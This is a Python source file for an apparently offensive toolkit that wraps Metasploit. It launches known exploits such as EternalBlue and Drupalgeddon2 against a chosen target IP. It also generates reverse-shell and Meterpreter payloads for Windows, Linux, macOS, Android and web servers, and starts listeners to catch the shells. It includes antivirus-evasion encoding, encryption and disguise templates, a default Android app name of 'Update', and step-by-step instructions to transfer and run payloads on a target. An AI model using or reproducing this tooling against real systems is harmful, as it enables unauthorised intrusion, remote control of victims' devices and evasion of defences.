#!/usr/bin/env python3
# app/exploitation/metasploit_runner.py - Metasploit Integration (Fixed Android APK)

import sys
import os
import subprocess
import time

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE, REPORTS_DIR
from utils import Logger, pause, clear_screen, InputValidator, CommandRunner, ReportWriter

class MetasploitRunner:
    def __init__(self):
        self.msfconsole = "msfconsole"
        self.msfvenom = "msfvenom"
        self.reports_dir = os.path.join(REPORTS_DIR, 'exploitation', 'metasploit')
        os.makedirs(self.reports_dir, exist_ok=True)
    
    def run(self):
        """Main Metasploit menu"""
        while True:
            clear_screen()
            print(f"\n{C_TITLE}╔══════════════════════════════════════════╗")
            print(f"║         METASPLOIT INTEGRATION           ║")
            print(f"╚══════════════════════════════════════════╝{C_RESET}\n")
            
            print(f"{C_INFO}  [1]  Launch Msfconsole{C_RESET}")
            print(f"{C_INFO}  [2]  Search Exploits{C_RESET}")
            print(f"{C_INFO}  [3]  Quick Exploit (RHOSTS){C_RESET}")
            print(f"{C_INFO}  [4]  Generate Payload (Msfvenom){C_RESET}")
            print(f"{C_INFO}  [5]  Start Metasploit Handler{C_RESET}")
            print(f"\n{C_WARN}  [0]  Back to Exploitation Menu{C_RESET}\n")
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            elif choice == '1':
                self.launch_msfconsole()
            elif choice == '2':
                self.search_exploits()
            elif choice == '3':
                self.quick_exploit()
            elif choice == '4':
                self.generate_payload()
            elif choice == '5':
                self.start_handler()
            else:
                Logger.error("Invalid choice!")
                time.sleep(1)
    
    def launch_msfconsole(self):
        """Launch Msfconsole"""
        clear_screen()
        print(f"\n{C_TITLE}═══ LAUNCH MSFCONSOLE ═══{C_RESET}\n")
        
        if not CommandRunner.check_tool('msfconsole'):
            Logger.error("Metasploit not installed!")
            Logger.info("Install: sudo apt install metasploit-framework")
            pause()
            return
        
        Logger.info("Launching Metasploit Framework Console...")
        Logger.warning("Type 'exit' to return to ProbeSuite")
        pause("Press Enter to launch msfconsole...")
        
        os.system('msfconsole')
        pause()
    
    def search_exploits(self):
        """Search for exploits"""
        clear_screen()
        print(f"\n{C_TITLE}═══ SEARCH EXPLOITS ═══{C_RESET}\n")
        
        if not CommandRunner.check_tool('msfconsole'):
            Logger.error("Metasploit not installed!")
            pause()
            return
        
        print(f"{C_INFO}Examples:{C_RESET}")
        print(f"  • apache")
        print(f"  • windows smb")
        print(f"  • eternal blue")
        print(f"  • drupal\n")
        
        search_term = input(f"{C_INFO}Enter search term: {C_RESET}").strip()
        
        if not search_term:
            Logger.error("Search term cannot be empty!")
            pause()
            return
        
        Logger.info(f"Searching for: {search_term}")
        print()
        
        # Generate report filename
        timestamp = ReportWriter.get_timestamp()
        report_file = os.path.join(self.reports_dir, f"search_{search_term}_{timestamp}.txt")
        
        # Create temporary rc file
        rc_file = "/tmp/msf_search.rc"
        with open(rc_file, 'w') as f:
            f.write(f"search {search_term}\n")
            f.write("exit\n")
        
        # Run msfconsole with rc file and capture output
        cmd = f"msfconsole -q -r {rc_file}"
        
        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            output_lines = []
            for line in process.stdout:
                print(line, end='')
                output_lines.append(line)
            
            process.wait()
            
            # Save to file
            content = ReportWriter.create_report_header("Metasploit Exploit Search", search_term)
            content += f"Command: {cmd}\n\n"
            content += "=" * 80 + "\n"
            content += "SEARCH RESULTS\n"
            content += "=" * 80 + "\n\n"
            content += ''.join(output_lines)
            
            with open(report_file, 'w') as f:
                f.write(content)
            
            Logger.success(f"Report saved: {report_file}")
            
        except Exception as e:
            Logger.error(f"Search failed: {e}")
        
        # Cleanup
        if os.path.exists(rc_file):
            os.remove(rc_file)
        
        pause()
    
    def quick_exploit(self):
        """Quick exploit runner"""
        clear_screen()
        print(f"\n{C_TITLE}═══ QUICK EXPLOIT ═══{C_RESET}\n")
        
        if not CommandRunner.check_tool('msfconsole'):
            Logger.error("Metasploit not installed!")
            pause()
            return
        
        print(f"{C_INFO}Popular Exploits:{C_RESET}")
        print(f"  {C_WARN}[Windows]{C_RESET}")
        print(f"  [1]  exploit/windows/smb/ms17_010_eternalblue      - EternalBlue SMB")
        print(f"  [2]  exploit/windows/smb/ms08_067_netapi           - MS08-067 NetAPI")
        print(f"  [3]  exploit/windows/dcerpc/ms03_026_dcom          - MS03-026 DCOM")
        print(f"  [4]  exploit/windows/smb/psexec                    - PsExec Pass-The-Hash")
        print()
        print(f"  {C_WARN}[Linux]{C_RESET}")
        print(f"  [5]  exploit/unix/ftp/vsftpd_234_backdoor          - VSFTPD Backdoor")
        print(f"  [6]  exploit/linux/samba/is_known_pipename         - Samba Named Pipe")
        print(f"  [7]  exploit/unix/misc/distcc_exec                 - DistCC Command Exec")
        print(f"  [8]  exploit/linux/http/apache_mod_cgi_bash_env    - Shellshock")
        print()
        print(f"  {C_WARN}[Web Applications]{C_RESET}")
        print(f"  [9]  exploit/unix/webapp/tomcat_mgr_upload         - Tomcat Manager Upload")
        print(f"  [10] exploit/multi/http/struts2_content_type_ognl  - Apache Struts2")
        print(f"  [11] exploit/unix/webapp/joomla_comfields_sqli     - Joomla SQLi")
        print(f"  [12] exploit/unix/webapp/drupal_drupalgeddon2      - Drupalgeddon2")
        print()
        print(f"  {C_WARN}[Database]{C_RESET}")
        print(f"  [13] exploit/windows/mssql/ms09_004_sp_replwritetovarbin - MS SQL")
        print(f"  [14] exploit/linux/mysql/mysql_yassl_hello         - MySQL YaSSL")
        print(f"  [15] exploit/multi/postgres/postgres_copy_from_program_cmd_exec - PostgreSQL")
        print()
        print(f"  {C_WARN}[Handlers]{C_RESET}")
        print(f"  [16] exploit/multi/handler                         - Generic Payload Handler")
        print()
        print(f"  [99] Custom exploit path\n")
        
        choice = input(f"{C_INFO}Select exploit [1-16, 99]: {C_RESET}").strip()
        
        exploits = {
            # Windows
            '1': 'exploit/windows/smb/ms17_010_eternalblue',
            '2': 'exploit/windows/smb/ms08_067_netapi',
            '3': 'exploit/windows/dcerpc/ms03_026_dcom',
            '4': 'exploit/windows/smb/psexec',
            
            # Linux
            '5': 'exploit/unix/ftp/vsftpd_234_backdoor',
            '6': 'exploit/linux/samba/is_known_pipename',
            '7': 'exploit/unix/misc/distcc_exec',
            '8': 'exploit/linux/http/apache_mod_cgi_bash_env',
            
            # Web Apps
            '9': 'exploit/unix/webapp/tomcat_mgr_upload',
            '10': 'exploit/multi/http/struts2_content_type_ognl',
            '11': 'exploit/unix/webapp/joomla_comfields_sqli',
            '12': 'exploit/unix/webapp/drupal_drupalgeddon2',
            
            # Database
            '13': 'exploit/windows/mssql/ms09_004_sp_replwritetovarbin',
            '14': 'exploit/linux/mysql/mysql_yassl_hello',
            '15': 'exploit/multi/postgres/postgres_copy_from_program_cmd_exec',
            
            # Handler
            '16': 'exploit/multi/handler',
        }
        
        if choice == '99':
            exploit_path = input(f"{C_INFO}Enter exploit path: {C_RESET}").strip()
        elif choice in exploits:
            exploit_path = exploits[choice]
        else:
            Logger.error("Invalid choice!")
            pause()
            return
        
        print()
        rhost = input(f"{C_INFO}Enter target IP (RHOST): {C_RESET}").strip()
        
        if not rhost:
            Logger.error("Target IP required!")
            pause()
            return
        
        # Optional settings
        lhost = input(f"{C_INFO}Enter local IP (LHOST) [optional]: {C_RESET}").strip()
        lport = input(f"{C_INFO}Enter local port (LPORT) [4444]: {C_RESET}").strip() or "4444"
        
        Logger.info(f"Exploit: {exploit_path}")
        Logger.info(f"Target: {rhost}")
        if lhost:
            Logger.info(f"Local: {lhost}:{lport}")
        
        # Create RC file
        rc_file = "/tmp/msf_exploit.rc"
        with open(rc_file, 'w') as f:
            f.write(f"use {exploit_path}\n")
            f.write(f"set RHOST {rhost}\n")
            if lhost:
                f.write(f"set LHOST {lhost}\n")
                f.write(f"set LPORT {lport}\n")
            f.write("show options\n")
            f.write("exploit\n")
        
        pause("Press Enter to run exploit...")
        
        cmd = f"msfconsole -q -r {rc_file}"
        os.system(cmd)
        
        # Cleanup
        if os.path.exists(rc_file):
            os.remove(rc_file)
        
        pause()
    
    def generate_payload(self):
        """Generate payload using msfvenom"""
        clear_screen()
        print(f"\n{C_TITLE}═══ GENERATE PAYLOAD (MSFVENOM) ═══{C_RESET}\n")
        
        if not CommandRunner.check_tool('msfvenom'):
            Logger.error("Msfvenom not installed!")
            Logger.info("Install: sudo apt install metasploit-framework")
            pause()
            return
        
        print(f"{C_INFO}Select Platform:{C_RESET}")
        print(f"  {C_WARN}[Windows]{C_RESET}")
        print(f"  [1]  Windows Reverse TCP (exe)")
        print(f"  [2]  Windows Reverse HTTPS (exe)")
        print(f"  [3]  Windows Meterpreter Staged (exe)")
        print(f"  [4]  Windows Meterpreter Stageless (exe)")
        print(f"  [5]  Windows DLL Injection")
        print(f"  [6]  Windows Service Binary")
        print()
        print(f"  {C_WARN}[Linux]{C_RESET}")
        print(f"  [7]  Linux x86 Reverse Shell (elf)")
        print(f"  [8]  Linux x64 Reverse Shell (elf)")
        print(f"  [9]  Linux Meterpreter (elf)")
        print(f"  [10] Linux ARM Reverse Shell")
        print()
        print(f"  {C_WARN}[macOS]{C_RESET}")
        print(f"  [11] macOS x64 Reverse Shell (macho)")
        print(f"  [12] macOS Meterpreter (macho)")
        print()
        print(f"  {C_WARN}[Android]{C_RESET}")
        print(f"  [13] Android Meterpreter (apk)")
        print(f"  [14] Android Reverse TCP (apk)")
        print(f"  [15] Android Bind Shell (apk)")
        print()
        print(f"  {C_WARN}[Web Scripts]{C_RESET}")
        print(f"  [16] PHP Reverse Shell")
        print(f"  [17] ASP Reverse Shell")
        print(f"  [18] ASPX Reverse Shell")
        print(f"  [19] JSP Reverse Shell")
        print(f"  [20] Python Reverse Shell")
        print(f"  [21] Perl Reverse Shell")
        print()
        print(f"  {C_WARN}[Other]{C_RESET}")
        print(f"  [22] Java WAR File")
        print(f"  [23] PowerShell Script")
        print(f"  [24] Bash Script")
        print()
        print(f"  [99] Custom payload\n")
        
        choice = input(f"{C_INFO}Select payload [1-24, 99]: {C_RESET}").strip()
        
        payloads = {
            # Windows
            '1': ('windows/meterpreter/reverse_tcp', 'exe'),
            '2': ('windows/meterpreter/reverse_https', 'exe'),
            '3': ('windows/meterpreter/reverse_tcp', 'exe'),
            '4': ('windows/meterpreter_reverse_tcp', 'exe'),
            '5': ('windows/x64/meterpreter/reverse_tcp', 'dll'),
            '6': ('windows/meterpreter/reverse_tcp', 'exe-service'),
            
            # Linux
            '7': ('linux/x86/meterpreter/reverse_tcp', 'elf'),
            '8': ('linux/x64/meterpreter/reverse_tcp', 'elf'),
            '9': ('linux/x64/meterpreter_reverse_tcp', 'elf'),
            '10': ('linux/armle/meterpreter/reverse_tcp', 'elf'),
            
            # macOS
            '11': ('osx/x64/shell_reverse_tcp', 'macho'),
            '12': ('osx/x64/meterpreter/reverse_tcp', 'macho'),
            
            # Android
            '13': ('android/meterpreter/reverse_tcp', 'apk'),
            '14': ('android/shell/reverse_tcp', 'apk'),
            '15': ('android/shell/bind_tcp', 'apk'),
            
            # Web Scripts
            '16': ('php/meterpreter/reverse_tcp', 'raw'),
            '17': ('windows/meterpreter/reverse_tcp', 'asp'),
            '18': ('windows/meterpreter/reverse_tcp', 'aspx'),
            '19': ('java/jsp_shell_reverse_tcp', 'raw'),
            '20': ('python/meterpreter/reverse_tcp', 'raw'),
            '21': ('cmd/unix/reverse_perl', 'raw'),
            
            # Other
            '22': ('java/jsp_shell_reverse_tcp', 'war'),
            '23': ('windows/x64/meterpreter/reverse_tcp', 'psh'),
            '24': ('cmd/unix/reverse_bash', 'raw'),
        }
        
        if choice == '99':
            payload = input(f"{C_INFO}Enter payload name: {C_RESET}").strip()
            format_type = input(f"{C_INFO}Enter format: {C_RESET}").strip()
        elif choice in payloads:
            payload, format_type = payloads[choice]
        else:
            Logger.error("Invalid choice!")
            pause()
            return
        
        print()
        lhost = input(f"{C_INFO}Enter LHOST (your IP): {C_RESET}").strip()
        lport = input(f"{C_INFO}Enter LPORT [4444]: {C_RESET}").strip() or "4444"
        
        if not lhost:
            Logger.error("LHOST required!")
            pause()
            return
        
        # Android specific options
        app_name = None
        use_raw_output = False
        if choice in ['13', '14', '15']:
            print(f"\n{C_INFO}Android Options:{C_RESET}")
            app_name = input(f"{C_INFO}App name [Update]: {C_RESET}").strip() or "Update"
            print(f"\n{C_INFO}Output Method:{C_RESET}")
            print(f"  [1] Direct output (-o) - Recommended")
            print(f"  [2] Raw output (R >) - Alternative method\n")
            output_method = input(f"{C_INFO}Select method [1-2]: {C_RESET}").strip() or "1"
            use_raw_output = (output_method == '2')
        
        # AV Evasion Options (NOT for Android/Web Scripts)
        encoder = ''
        iterations = '1'
        
        # Skip encoder for Android and some web payloads
        skip_encoder = choice in ['13', '14', '15', '16', '19', '20', '21', '24']
        
        if not skip_encoder:
            print(f"\n{C_TITLE}═══ AV EVASION OPTIONS ═══{C_RESET}\n")
            print(f"{C_INFO}Encoders:{C_RESET}")
            print(f"  [1] No encoding")
            print(f"  [2] x86/shikata_ga_nai (excellent)")
            print(f"  [3] x64/zutto_dekiru (x64 only)")
            print(f"  [4] x86/call4_dword_xor")
            print(f"  [5] x86/countdown")
            print(f"  [6] x86/fnstenv_mov")
            print(f"  [7] x86/jmp_call_additive")
            print(f"  [8] cmd/powershell_base64")
            print(f"  [9] php/base64")
            print(f"  [10] Multiple iterations (shikata_ga_nai x15)\n")
            
            enc_choice = input(f"{C_INFO}Select encoder [1-10]: {C_RESET}").strip()
            
            encoders = {
                '2': 'x86/shikata_ga_nai',
                '3': 'x64/zutto_dekiru',
                '4': 'x86/call4_dword_xor',
                '5': 'x86/countdown',
                '6': 'x86/fnstenv_mov',
                '7': 'x86/jmp_call_additive',
                '8': 'cmd/powershell_base64',
                '9': 'php/base64',
                '10': 'x86/shikata_ga_nai',
            }
            
            encoder = encoders.get(enc_choice, '')
            
            if enc_choice == '10':
                iterations = '15'
            elif encoder and enc_choice not in ['8', '9']:
                iterations = input(f"{C_INFO}Encoding iterations [7]: {C_RESET}").strip() or '7'
        else:
            if choice in ['13', '14', '15']:
                Logger.warning("Note: Standard encoders don't work with Android Dalvik architecture")
                Logger.info("Android APK already uses APK signing which provides basic obfuscation")
            else:
                Logger.warning("Encoder not available for this payload type")
        
        # Additional options for Windows
        template = ""
        obfuscate = False
        encrypt_payload = ""
        encrypt_key = ""
        
        if choice in ['1', '2', '3', '4', '5', '6']:
            print(f"\n{C_INFO}Template Options (optional):{C_RESET}")
            print(f"  [1] No template")
            print(f"  [2] Use custom template EXE")
            print(f"  [3] Use WinRAR SFX")
            print(f"  [4] Use calc.exe template\n")
            
            template_choice = input(f"{C_INFO}Select template [1-4]: {C_RESET}").strip()
            
            if template_choice == '2':
                template = input(f"{C_INFO}Enter template path: {C_RESET}").strip()
            elif template_choice == '3':
                template = "/usr/share/windows-binaries/winrar.exe"
            elif template_choice == '4':
                template = "calc.exe"
            
            # Advanced AV Evasion
            print(f"\n{C_TITLE}═══ ADVANCED AV EVASION ═══{C_RESET}\n")
            print(f"{C_INFO}Additional Obfuscation:{C_RESET}")
            print(f"  [1] None")
            print(f"  [2] XOR Encryption")
            print(f"  [3] RC4 Encryption")
            print(f"  [4] AES256 Encryption")
            print(f"  [5] Base64 Encryption\n")
            
            obf_choice = input(f"{C_INFO}Select encryption [1-5]: {C_RESET}").strip()
            
            if obf_choice == '2':
                encrypt_payload = "xor"
                encrypt_key = input(f"{C_INFO}Enter XOR key (or press Enter for random): {C_RESET}").strip()
            elif obf_choice == '3':
                encrypt_payload = "rc4"
                encrypt_key = input(f"{C_INFO}Enter RC4 key (or press Enter for random): {C_RESET}").strip()
            elif obf_choice == '4':
                encrypt_payload = "aes256"
                encrypt_key = input(f"{C_INFO}Enter AES key (or press Enter for random): {C_RESET}").strip()
            elif obf_choice == '5':
                encrypt_payload = "base64"
        
        # Output filename
        timestamp = ReportWriter.get_timestamp()
        
        # Set proper extension based on format
        if format_type == 'apk':
            ext = 'apk'
        elif format_type == 'raw':
            if choice == '16':
                ext = 'php'
            elif choice == '19':
                ext = 'jsp'
            elif choice == '20':
                ext = 'py'
            elif choice == '21':
                ext = 'pl'
            elif choice == '24':
                ext = 'sh'
            else:
                ext = 'txt'
        else:
            ext = format_type
        
        output = os.path.join(self.reports_dir, f"payload_{timestamp}.{ext}")
        
        Logger.info(f"Generating payload...")
        Logger.info(f"Payload: {payload}")
        Logger.info(f"LHOST: {lhost}")
        Logger.info(f"LPORT: {lport}")
        Logger.info(f"Format: {format_type}")
        if choice in ['13', '14', '15']:
            Logger.info(f"Method: {'Raw output (R >)' if use_raw_output else 'Direct output (-o)'}")
        if encoder:
            Logger.info(f"Encoder: {encoder} (x{iterations})")
        
        # Build command for Android APK
        if choice in ['13', '14', '15']:  # Android payloads
            cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport}"
            if use_raw_output:
                # Method 2: Raw output with redirection
                cmd += f" R > {output}"
            else:
                # Method 1: Direct output (recommended)
                cmd += f" -o {output}"
        else:
            # Build command for other platforms
            cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport}"
            
            # Add format
            cmd += f" -f {format_type}"
            
            # Add encoder (only if not Android/incompatible)
            if encoder and not skip_encoder:
                cmd += f" -e {encoder} -i {iterations}"
            
            # Add template (only for Windows)
            if template and os.path.exists(template):
                cmd += f" -x {template} -k"
            
            # Add encryption
            if encrypt_payload:
                cmd += f" --encrypt {encrypt_payload}"
                if encrypt_key:
                    cmd += f" --encrypt-key {encrypt_key}"
            
            # Add output
            cmd += f" -o {output}"
            
            # Add bad chars removal (optional) - NOT for Android
            if not choice in ['13', '14', '15']:
                print(f"\n{C_INFO}Advanced Options:{C_RESET}")
                remove_bad = input(f"{C_INFO}Remove bad characters? (y/n) [n]: {C_RESET}").strip().lower()
                if remove_bad == 'y':
                    bad_chars = input(f"{C_INFO}Enter bad chars (e.g., \\x00\\x0a): {C_RESET}").strip()
                    if bad_chars:
                        cmd += f" -b '{bad_chars}'"
        
        print(f"\n{C_INFO}Command:{C_RESET}")
        print(f"{cmd}\n")
        
        pause("Press Enter to generate...")
        
        # Execute command - handle raw output redirection differently
        if choice in ['13', '14', '15'] and use_raw_output:
            # For raw output with redirection, use os.system
            returncode = os.system(cmd)
            returncode = 0 if returncode == 0 else 1
            stdout = ""
            stderr = ""
        else:
            # For regular output, use CommandRunner
            returncode, stdout, stderr = CommandRunner.run(cmd, shell=True, timeout=180)
        
        if returncode == 0:
            Logger.success(f"Payload generated successfully!")
            Logger.info(f"Location: {output}")
            
            if os.path.exists(output):
                size = os.path.getsize(output)
                Logger.info(f"Size: {size} bytes ({size/1024:.2f} KB)")
                
                # Save detailed report
                report_file = os.path.join(self.reports_dir, f"payload_info_{timestamp}.txt")
                content = ReportWriter.create_report_header("Msfvenom Payload Generation", payload)
                content += f"Command: {cmd}\n\n"
                content += "Configuration:\n"
                content += f"  Payload: {payload}\n"
                content += f"  LHOST: {lhost}\n"
                content += f"  LPORT: {lport}\n"
                content += f"  Format: {format_type}\n"
                if encoder:
                    content += f"  Encoder: {encoder}\n"
                    content += f"  Iterations: {iterations}\n"
                if encrypt_payload:
                    content += f"  Encryption: {encrypt_payload}\n"
                    if encrypt_key:
                        content += f"  Encryption Key: {encrypt_key}\n"
                if template:
                    content += f"  Template: {template}\n"
                if app_name:
                    content += f"  App Name: {app_name}\n"
                content += f"\nOutput:\n"
                content += f"  File: {output}\n"
                content += f"  Size: {size} bytes ({size/1024:.2f} KB)\n\n"
                
                # Handler setup instructions
                content += "=" * 80 + "\n"
                content += "HANDLER SETUP\n"
                content += "=" * 80 + "\n\n"
                content += "To catch the reverse shell, use:\n\n"
                content += f"msfconsole -q -x \"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit\"\n\n"
                
                # Usage instructions
                content += "=" * 80 + "\n"
                content += "USAGE INSTRUCTIONS\n"
                content += "=" * 80 + "\n\n"
                
                if choice in ['1', '2', '3', '4', '5', '6']:
                    content += "Windows:\n"
                    content += f"  1. Transfer {os.path.basename(output)} to target\n"
                    content += "  2. Execute on target system\n"
                    content += "  3. Catch with Metasploit handler\n"
                elif choice in ['7', '8', '9', '10']:
                    content += "Linux:\n"
                    content += f"  1. Transfer {os.path.basename(output)} to target\n"
                    content += f"  2. chmod +x {os.path.basename(output)}\n"
                    content += f"  3. ./{os.path.basename(output)}\n"
                elif choice in ['13', '14', '15']:
                    content += "Android:\n"
                    content += f"  1. Transfer {os.path.basename(output)} to device\n"
                    content += "  2. Install APK: adb install {os.path.basename(output)}\n"
                    content += "  3. Launch the app on device\n"
                    content += "  4. Connection will be established\n"
                elif choice in ['16', '17', '18', '19']:
                    content += "Web Shell:\n"
                    content += f"  1. Upload {os.path.basename(output)} to web server\n"
                    content += "  2. Access via browser or curl\n"
                    content += "  3. Catch with Metasploit handler\n"
                
                with open(report_file, 'w') as f:
                    f.write(content)
                
                Logger.success(f"Report saved: {report_file}")
                
                # Show handler command
                print(f"\n{C_TITLE}Handler Command:{C_RESET}")
                print(f"{C_OK}msfconsole -q -x \"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit\"{C_RESET}")
                
                # Ask to start handler
                print(f"\n{C_TITLE}═══ START HANDLER ═══{C_RESET}\n")
                print(f"{C_INFO}Payload generated successfully!{C_RESET}")
                print(f"{C_WARN}Do you want to start the handler now?{C_RESET}\n")
                print(f"  [1] Yes - Start handler immediately")
                print(f"  [2] No - Return to menu")
                print(f"  [3] Show handler command only\n")
                
                handler_choice = input(f"{C_INFO}Select option [1-3]: {C_RESET}").strip()
                
                if handler_choice == '1':
                    Logger.info("Starting Metasploit handler...")
                    Logger.warning("Press Ctrl+C to stop handler and return to menu")
                    time.sleep(2)
                    
                    # Start handler with the same payload configuration
                    self._start_specific_handler(payload, lhost, lport)
                    
                elif handler_choice == '3':
                    print(f"\n{C_INFO}Handler Command:{C_RESET}")
                    print(f"{C_OK}msfconsole -q -x \"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit\"{C_RESET}")
                    pause()
                
        else:
            Logger.error("Payload generation failed!")
            if stderr:
                print(f"{C_ERR}{stderr}{C_RESET}")
        
        pause()
    
    def _start_specific_handler(self, payload, lhost, lport):
        """Start handler with specific configuration"""
        # Create RC file for handler
        rc_file = "/tmp/msf_handler.rc"
        with open(rc_file, 'w') as f:
            f.write("use exploit/multi/handler\n")
            f.write(f"set PAYLOAD {payload}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write(f"set LPORT {lport}\n")
            f.write("exploit\n")  # Simple exploit without background job
        
        # Run handler
        cmd = f"msfconsole -q -r {rc_file}"
        os.system(cmd)
        
        # Cleanup
        if os.path.exists(rc_file):
            os.remove(rc_file)
    
    def start_handler(self):
        """Start Metasploit handler"""
        clear_screen()
        print(f"\n{C_TITLE}═══ START HANDLER ═══{C_RESET}\n")
        
        if not CommandRunner.check_tool('msfconsole'):
            Logger.error("Metasploit not installed!")
            pause()
            return
        
        print(f"{C_INFO}Handler Payloads:{C_RESET}")
        print(f"  [1] windows/meterpreter/reverse_tcp")
        print(f"  [2] windows/meterpreter/reverse_https")
        print(f"  [3] linux/x86/meterpreter/reverse_tcp")
        print(f"  [4] linux/x64/meterpreter/reverse_tcp")
        print(f"  [5] android/meterpreter/reverse_tcp")
        print(f"  [6] php/meterpreter/reverse_tcp")
        print(f"  [7] python/meterpreter/reverse_tcp")
        print(f"  [8] java/jsp_shell_reverse_tcp")
        print(f"  [9] Custom payload\n")
        
        choice = input(f"{C_INFO}Select payload [1-9]: {C_RESET}").strip()
        
        payloads = {
            '1': 'windows/meterpreter/reverse_tcp',
            '2': 'windows/meterpreter/reverse_https',
            '3': 'linux/x86/meterpreter/reverse_tcp',
            '4': 'linux/x64/meterpreter/reverse_tcp',
            '5': 'android/meterpreter/reverse_tcp',
            '6': 'php/meterpreter/reverse_tcp',
            '7': 'python/meterpreter/reverse_tcp',
            '8': 'java/jsp_shell_reverse_tcp',
        }
        
        if choice == '9':
            payload = input(f"{C_INFO}Enter payload name: {C_RESET}").strip()
        elif choice in payloads:
            payload = payloads[choice]
        else:
            Logger.error("Invalid choice!")
            pause()
            return
        
        print()
        lhost = input(f"{C_INFO}Enter LHOST (your IP): {C_RESET}").strip()
        lport = input(f"{C_INFO}Enter LPORT [4444]: {C_RESET}").strip() or "4444"
        
        if not lhost:
            Logger.error("LHOST required!")
            pause()
            return
        
        Logger.info(f"Payload: {payload}")
        Logger.info(f"LHOST: {lhost}")
        Logger.info(f"LPORT: {lport}")
        Logger.warning("Handler will listen for incoming connections...")
        
        # Create RC file
        rc_file = "/tmp/msf_handler.rc"
        with open(rc_file, 'w') as f:
            f.write("use exploit/multi/handler\n")
            f.write(f"set PAYLOAD {payload}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write(f"set LPORT {lport}\n")
            f.write("exploit\n")  # Simple exploit without background job
        
        pause("Press Enter to start handler...")
        
        cmd = f"msfconsole -q -r {rc_file}"
        os.system(cmd)
        
        # Cleanup
        if os.path.exists(rc_file):
            os.remove(rc_file)
        
        pause()

if __name__ == "__main__":
    runner = MetasploitRunner()
    runner.run()